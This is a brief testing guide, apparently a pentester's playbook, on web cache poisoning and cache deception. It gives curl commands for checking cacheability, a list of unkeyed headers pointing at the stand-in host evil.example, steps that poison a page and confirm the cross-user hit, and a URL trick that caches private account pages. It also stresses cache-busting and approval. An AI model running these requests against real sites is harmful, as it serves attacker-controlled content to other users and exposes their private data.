# Web cache poisoning techniques (steps 1–4)
# Always cache-bust while probing (unique ?cb=) so you don't poison the real page; only drop the
# buster to CONFIRM a cross-user hit, with approval. Record in poison_tests.jsonl:
# {input, keyed, reflected, cached, hit_on_clean_request, impact}.

## Detect cacheability
```
curl -sI "https://TARGET/path?cb=rs1" | grep -iE 'x-cache|age|cache-control|vary|cf-cache-status'
```
`X-Cache: hit`/`cf-cache-status: HIT` + `Age:` increasing ⇒ cached. `Vary:` lists keyed headers.

## Unkeyed inputs to try (reflected but NOT in the cache key)
```
X-Forwarded-Host: evil.example
X-Forwarded-Scheme: nothttps        # some apps redirect to X-Forwarded-Scheme://X-Forwarded-Host
X-Forwarded-Port: 1337
X-Host: evil.example
X-Original-URL: /evil
X-Rewrite-URL: /evil
X-Forwarded-Server: evil.example
```
Plus unkeyed query params (Param Miner "guess params"): a param that changes the body but not the key.

## Confirm (the proof)
1. Poison with a cache-buster you own: `curl -s "https://TARGET/?cb=rs7f3q" -H 'X-Forwarded-Host: evil.example'`
2. Re-request WITHOUT the attacker header, SAME buster: `curl -s "https://TARGET/?cb=rs7f3q"`
3. If the clean request returns the poisoned content (`X-Cache: hit`) → confirmed cross-user poisoning.

## Cache deception (variant)
`https://TARGET/account.php/nonexistent.css` — if the CDN caches by extension, a private page may be
cached and served to anonymous users. Confirm a second anonymous request gets the private content.

## Hygiene
Benign payloads; buster-scoped; approval for shared caches; purge or let short TTL expire; cleanup.md.
